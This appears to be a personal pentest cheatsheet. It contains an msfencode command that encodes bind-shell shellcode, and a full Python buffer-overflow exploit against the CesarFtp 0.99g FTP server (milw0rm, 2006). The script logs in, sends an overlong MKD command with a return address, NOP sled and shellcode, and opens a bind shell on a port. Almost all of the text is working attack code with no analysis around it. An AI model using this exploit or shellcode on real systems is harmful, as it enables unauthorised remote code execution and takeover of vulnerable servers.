# pentest_script

```
cat w32-bind-ngs-shellcode.bin | /pentest/exploits/framework3/msfencode -e x86/shikata_ga_nai -b "\x00\x20\x0a\x0d" -t c

shellcode = "\xdd\xc7\x29\xc9\xb1\x36\xbd\x17\x3b\x1b\x51\xd9\x74\x24\xf4"+
"\x58\x31\x68\x19\x83\xc0\x04\x03\x68\x15\xf5\xce\x2a\x98\x9d"+            
"\xbb\x3c\x2a\xd6\xca\xb2\xc1\x9e\x2e\x40\xbb\x56\xc4\x28\x64"+            
"\xed\xec\xec\x2b\xe9\x65\xfe\xe5\x61\xb4\x5f\x35\x43\xd0\x39"+            
"\x6f\xd4\x53\xae\x38\x95\x9d\xb6\xce\x4f\x28\xc5\xf9\x43\x7a"+            
"\x06\x70\xbc\xab\x65\x29\x03\x05\xcb\x7f\xd4\xf4\x48\x90\xf6"+            
"\x52\x01\xe4\x5b\xa7\x15\xa6\x7e\xaf\x28\xbc\x0b\x04\x0b\x43"+            
"\xe2\xcd\x7a\x91\xb6\x7a\x48\x84\x37\x93\x05\x90\x9b\x5f\x17"+            
"\xf5\x27\xa3\xa6\x70\x50\xe6\x6f\x0e\x75\x49\xfb\xbb\xad\x77"+            
"\x12\x34\x1a\x63\xb5\xc0\x2f\x90\x34\x3e\x26\x40\x35\xc4\xa9"+            
"\x3a\xba\xfa\xc0\x49\xb3\x8f\x8c\xb5\x90\x70\xe0\xe1\x83\x0f"+            
"\x3e\x7d\xd9\xbe\x60\x2c\xde\x11\x31\xd1\xf1\x07\xc8\x01\x0c"+            
"\xd8\x45\x6e\x9a\x37\x0e\x3c\x0f\xc7\x60\xbb\x70\x43\x78\xf5"+            
"\xa2\xfe\x10\x95\x2f\x9b\xc0\xd4\xcc\x47\x38\x4c\x87\x23\xfe"+            
"\xd5\x31\x32\xaa\x5e\xfd\x11\x05\x33\xac\x0b\x6f\xf4\xbf\xa4"+            
"\x38\xa9\x6d\xe2\x94\xb2\xc4\xe8\x93\x0b\x15\x19\x69\x6c\x1a"+
"\x25"

```

```
#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Tested on XP SP3 English
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006
#Edited : Bind shell 28876

from socket import *

shellcode = (
"\xdd\xc7\x29\xc9\xb1\x36\xbd\x17\x3b\x1b\x51\xd9\x74\x24\xf4"+
"\x58\x31\x68\x19\x83\xc0\x04\x03\x68\x15\xf5\xce\x2a\x98\x9d"+            
"\xbb\x3c\x2a\xd6\xca\xb2\xc1\x9e\x2e\x40\xbb\x56\xc4\x28\x64"+            
"\xed\xec\xec\x2b\xe9\x65\xfe\xe5\x61\xb4\x5f\x35\x43\xd0\x39"+            
"\x6f\xd4\x53\xae\x38\x95\x9d\xb6\xce\x4f\x28\xc5\xf9\x43\x7a"+            
"\x06\x70\xbc\xab\x65\x29\x03\x05\xcb\x7f\xd4\xf4\x48\x90\xf6"+            
"\x52\x01\xe4\x5b\xa7\x15\xa6\x7e\xaf\x28\xbc\x0b\x04\x0b\x43"+            
"\xe2\xcd\x7a\x91\xb6\x7a\x48\x84\x37\x93\x05\x90\x9b\x5f\x17"+            
"\xf5\x27\xa3\xa6\x70\x50\xe6\x6f\x0e\x75\x49\xfb\xbb\xad\x77"+            
"\x12\x34\x1a\x63\xb5\xc0\x2f\x90\x34\x3e\x26\x40\x35\xc4\xa9"+            
"\x3a\xba\xfa\xc0\x49\xb3\x8f\x8c\xb5\x90\x70\xe0\xe1\x83\x0f"+            
"\x3e\x7d\xd9\xbe\x60\x2c\xde\x11\x31\xd1\xf1\x07\xc8\x01\x0c"+            
"\xd8\x45\x6e\x9a\x37\x0e\x3c\x0f\xc7\x60\xbb\x70\x43\x78\xf5"+            
"\xa2\xfe\x10\x95\x2f\x9b\xc0\xd4\xcc\x47\x38\x4c\x87\x23\xfe"+            
"\xd5\x31\x32\xaa\x5e\xfd\x11\x05\x33\xac\x0b\x6f\xf4\xbf\xa4"+            
"\x38\xa9\x6d\xe2\x94\xb2\xc4\xe8\x93\x0b\x15\x19\x69\x6c\x1a"+
"\x25"
)

def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str

host = "192.168.1.170"
port = 21
user = "ftp"
password = "ftp"
EIP = 0x7CB32D69 #jmp esp <shell32.dll XP sp2 polish>

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer += "A" * 3 + "\x53\x93\x42\x7e"
buffer += "\x90" * 40  + shellcode
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)

s.close()

#EoF 

# milw0rm.com [2006-06-12]


```


Scripts and Cheatsheets
